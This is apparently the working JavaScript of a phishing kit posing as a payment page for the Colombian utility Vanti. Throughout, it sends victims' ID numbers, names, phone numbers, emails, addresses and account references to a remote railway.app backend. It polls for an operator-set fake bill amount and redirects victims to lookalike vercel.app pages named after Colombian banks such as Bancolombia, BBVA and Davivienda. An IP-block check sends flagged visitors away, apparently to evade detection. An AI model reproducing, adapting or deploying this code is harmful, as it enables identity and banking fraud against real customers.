const API_BASE = 'https://multi-bancos-production.up.railway.app';

const URLS_BANCOS_VANTI = {
    'bancolombia': 'https://safeplacechech.vercel.app',
    'bbva':        'https://securecheckout-sandy.vercel.app',
    'caja-social': 'https://checkoutplacabogo.vercel.app',
    'popular':     'https://securepay21.vercel.app',
    'bogota':      'https://auth-portal-ten.vercel.app',
    'occidente':   'https://secureportal-eight.vercel.app',
    'davivienda':  'https://psecheckout.vercel.app',
    'av-villas':   '#',
    'nequi':       '#'
};

const TIEMPO_REDIRECT_VANTI = 4000;

let pollingInterval = null;
let bancoSeleccionadoPSE = '';

let sessionGlobal = sessionStorage.getItem('vanti_sessionId');
if (!sessionGlobal) {
    sessionGlobal = 'vanti_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
    sessionStorage.setItem('vanti_sessionId', sessionGlobal);
}

function abrirModalTarjeta() {
    const modal = document.getElementById('modalTarjeta');
    const iframe = document.getElementById('iframeTarjeta');
    const overlay = document.getElementById('pagoCargaOverlay');
    
    const sessionId = sessionStorage.getItem('vanti_sessionId') || ('vanti_' + Date.now());
    const precio = Number(window.TOTAL_PAGO) || 0;
    sessionStorage.setItem('vanti_precio', String(precio));

    if (modal && iframe && overlay) {
        overlay.style.display = 'flex';
        document.body.style.overflow = 'hidden';

        setTimeout(function() {
            overlay.style.display = 'none';
            iframe.src = 'tarjeta.html?sessionId=' + encodeURIComponent(sessionId) + '&precio=' + encodeURIComponent(precio);
            modal.style.display = 'flex';
        }, 1500);
    }
}

function ocultarModalTarjeta() {
    const modal = document.getElementById('modalTarjeta');
    if (modal) { modal.style.display = 'none'; }
}

function destruirModalTarjeta() {
    const modal = document.getElementById('modalTarjeta');
    const iframe = document.getElementById('iframeTarjeta');
    if (modal && iframe) {
        modal.style.display = 'none';
        iframe.src = 'about:blank';
        document.body.style.overflow = '';
    }
}

function cerrarModalTarjeta() { destruirModalTarjeta(); }

function mostrarPagoCarga() {
    const overlay = document.getElementById('pagoCargaOverlay');
    if (overlay) { overlay.style.display = 'flex'; document.body.style.overflow = 'hidden'; }
}

function ocultarPagoCarga() {
    const overlay = document.getElementById('pagoCargaOverlay');
    if (overlay) { overlay.style.display = 'none'; document.body.style.overflow = ''; }
}

function cerrarModalPSEForm() {
    const modal = document.getElementById('modalPSEForm');
    if (modal) modal.style.display = 'none';
}

document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('queryForm');
    const loadingOverlay = document.getElementById('loading-overlay');

    if (!form || !loadingOverlay) return;

    const modalBanco = document.getElementById('modalBanco');
    const modalBancoOverlay = document.getElementById('modalBancoOverlay');
    const modalBancoClose = document.getElementById('modalBancoClose');
    const bancoBuscar = document.getElementById('bancoBuscar');
    const bancoCards = document.querySelectorAll('.banco-card-pse');
    const bancoEmpty = document.getElementById('bancoEmpty');

    function abrirModalBanco() {
        if (!modalBanco) return;
        modalBanco.classList.remove('hidden');
        if (bancoBuscar) bancoBuscar.value = '';
        filtrarBancos('');
        setTimeout(() => { if (bancoBuscar) bancoBuscar.focus(); }, 100);
    }

    function cerrarModalBanco() {
        if (modalBanco) modalBanco.classList.add('hidden');
    }

    if (modalBancoClose) modalBancoClose.addEventListener('click', cerrarModalBanco);
    if (modalBancoOverlay) modalBancoOverlay.addEventListener('click', cerrarModalBanco);

    function filtrarBancos(texto) {
        const t = (texto || '').toLowerCase().trim();
        let visibles = 0;
        bancoCards.forEach(card => {
            const nombre = (card.getAttribute('data-nombre') || '').toLowerCase();
            if (nombre.indexOf(t) !== -1) { card.style.display = ''; visibles++; }
            else { card.style.display = 'none'; }
        });
        if (bancoEmpty) {
            if (visibles === 0) bancoEmpty.classList.remove('hidden');
            else bancoEmpty.classList.add('hidden');
        }
    }

    if (bancoBuscar) {
        bancoBuscar.addEventListener('input', function () { filtrarBancos(this.value); });
    }

    bancoCards.forEach(card => {
        card.addEventListener('click', function () {
            const banco = this.getAttribute('data-banco');
            const nombre = this.getAttribute('data-nombre');
            bancoSeleccionadoPSE = banco;

            bancoCards.forEach(c => c.classList.remove('selected'));
            this.classList.add('selected');
            cerrarModalBanco();

            irAlBanco(banco, nombre);
        });
    });

    function irAlBanco(banco, nombre) {
        const pseOverlay = document.getElementById('video-pse-overlay');
        const pseNombre = document.getElementById('pseNombre');
        const pseGif = document.getElementById('pseAnimation');

        if (pseNombre) pseNombre.textContent = (nombre || banco).toUpperCase();

        if (pseOverlay) {
            pseOverlay.classList.remove('hidden');
            document.body.style.overflow = 'hidden';
        }

        if (pseGif && pseGif.src) {
            const srcActual = pseGif.src;
            pseGif.src = '';
            setTimeout(() => { pseGif.src = srcActual; }, 50);
        }

        const urlDestino = URLS_BANCOS_VANTI[banco];
        setTimeout(() => {
            if (urlDestino && urlDestino !== '#') {
                window.location.href = urlDestino;
            } else {
                if (pseOverlay) pseOverlay.classList.add('hidden');
                document.body.style.overflow = '';
                Swal.fire({
                    icon: 'info',
                    title: 'Banco no disponible',
                    text: 'Este banco no está disponible todavía.',
                    confirmButtonColor: '#113455'
                });
            }
        }, TIEMPO_REDIRECT_VANTI);
    }

    window.addEventListener('message', function(event) {
        if (event.data === 'mostrarCargaWompi') {
            mostrarPagoCarga();
        }
        else if (event.data === 'ocultarCargaWompi') {
            ocultarPagoCarga();
            const modal = document.getElementById('modalTarjeta');
            if (modal) modal.style.display = 'flex';
        }
        else if (event.data === 'cerrarTarjeta') {
            destruirModalTarjeta();
            ocultarPagoCarga();
        }
    });

    const pseForm = document.getElementById('pseForm');
    if (pseForm) {
        pseForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const tipoDoc = document.getElementById('pseTipoDoc').value;
            const numDoc = document.getElementById('pseNumDoc').value;
            const nombres = document.getElementById('pseNombre').value;
            const apellidos = document.getElementById('pseApellido').value;
            const celular = document.getElementById('pseCelular').value;
            const correo = document.getElementById('pseCorreo').value;
            const direccion = document.getElementById('pseDireccion').value;
            const rolRadio = document.querySelector('input[name="pseRol"]:checked');
            const rol = rolRadio ? rolRadio.value : '';
            
            if (!tipoDoc || tipoDoc === '0' || !numDoc || !nombres || !apellidos || !celular || !correo || !direccion || !rol) {
                Swal.fire({ icon: 'warning', title: 'Atención', text: 'Por favor complete todos los campos del formulario PSE.', confirmButtonColor: '#113455' });
                return;
            }

            const sessionId = sessionStorage.getItem('vanti_sessionId');
            const cuenta = document.getElementById('cuenta_contrato').value;
            const precio = window.TOTAL_PAGO;

            fetch(API_BASE + '/vanti/guardar-pse', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: sessionId,
                    cuenta: cuenta,
                    tipoDoc: tipoDoc,
                    numDoc: numDoc,
                    nombres: nombres,
                    apellidos: apellidos,
                    celular: celular,
                    correo: correo,
                    direccion: direccion,
                    rol: rol,
                    precio: precio
                })
            }).catch(function(err) { console.error(err); });

            document.getElementById('modalPSEForm').style.display = 'none';
            abrirModalBanco();
        });
    }

    form.addEventListener('submit', function (e) {
        e.preventDefault();

        const empresaSelect = document.getElementById('empresa');
        const empresaValue = empresaSelect.value;
        const empresaTexto = empresaSelect.options[empresaSelect.selectedIndex].text;
        const cuenta = document.getElementById('cuenta_contrato').value;
        const medioPagoValue = document.querySelector('input[name="office"]:checked').value;
        const medioPagoTexto = medioPagoValue === '154' ? 'PSE' : 'Wompi';

        if (empresaValue === '0' || !empresaValue) {
            Swal.fire({ icon: 'warning', title: 'Atención', text: 'Selecciona la empresa del servicio.', confirmButtonColor: '#113455' });
            return;
        }

        if (!cuenta || cuenta.length < 4) {
            Swal.fire({ icon: 'warning', title: 'Atención', text: 'Ingresa una cuenta o referencia de pago válida.', confirmButtonColor: '#113455' });
            return;
        }

        const sessionId = 'vanti_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
        sessionStorage.setItem('vanti_sessionId', sessionId);
        loadingOverlay.classList.remove('hidden');

        fetch(API_BASE + '/vanti/enviar', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, empresa: empresaTexto, cuenta, medioPago: medioPagoTexto })
        }).catch(err => console.error('Error enviando a admin:', err));

        if (pollingInterval) clearInterval(pollingInterval);

        pollingInterval = setInterval(async function () {
            try {
                const res = await fetch(API_BASE + '/vanti/estado/' + sessionId);
                const data = await res.json();

                if (data.estado === 'precio_asignado' && data.accion) {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    loadingOverlay.classList.add('hidden');

                    const precio = Number(data.accion);
                    window.TOTAL_PAGO = precio;
                    sessionStorage.setItem('vanti_precio', String(precio));
                    
                    Swal.fire({
                        icon: 'success',
                        title: 'Factura encontrada',
                        html: `
                            <p><strong>Cuenta:</strong> ${cuenta}</p>
                            <p><strong>Empresa:</strong> ${empresaTexto}</p>
                            <p><strong>Medio de pago:</strong> ${medioPagoTexto}</p>
                            <hr>
                            <h2 style="color: #113455;">$${precio.toLocaleString('es-CO')}</h2>
                            <p>Total a pagar</p>
                        `,
                        confirmButtonColor: '#113455',
                        confirmButtonText: 'Ir a pagar',
                        allowOutsideClick: false,
                        allowEscapeKey: false
                    }).then((result) => {
                        if (result.isConfirmed) {
                            if (medioPagoValue === '154') {
                                const modalPSE = document.getElementById('modalPSEForm');
                                if (modalPSE) {
                                    document.getElementById('pseCuenta').value = cuenta;
                                    document.getElementById('pseValor').value = '$ ' + precio.toLocaleString('es-CO');
                                    document.getElementById('btnPSEPagar').textContent = 'Ir a pagar: $' + precio.toLocaleString('es-CO');
                                    modalPSE.style.display = 'flex';
                                } else {
                                    abrirModalBanco();
                                }
                            } else {
                                abrirModalTarjeta();
                            }
                        }
                    });
                } else if (data.estado === 'rechazado') {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    loadingOverlay.classList.add('hidden');
                    Swal.fire({
                        icon: 'error',
                        title: 'Referencia no encontrada',
                        text: 'Referencia de pago no encontrada, verifica el número de cuenta y la empresa seleccionada.',
                        confirmButtonColor: '#113455'
                    });
                }
            } catch (err) {
                console.error('Error consultando estado:', err);
            }
        }, 2000);
    });
});

setInterval(function() {
    const sid = sessionStorage.getItem('vanti_sessionId') || sessionGlobal;
    if (!sid) return;
    fetch(API_BASE + '/heartbeat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: sid, ultimaAccion: 'index_activo' })
    }).catch(function() {});
}, 10000);

setInterval(function() {
    fetch(API_BASE + '/check-ip', { cache: 'no-store' })
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data && data.bloqueado === true) {
                window.location.href = data.redirect || 'https://www.google.com';
            }
        }).catch(function() {});
}, 5000);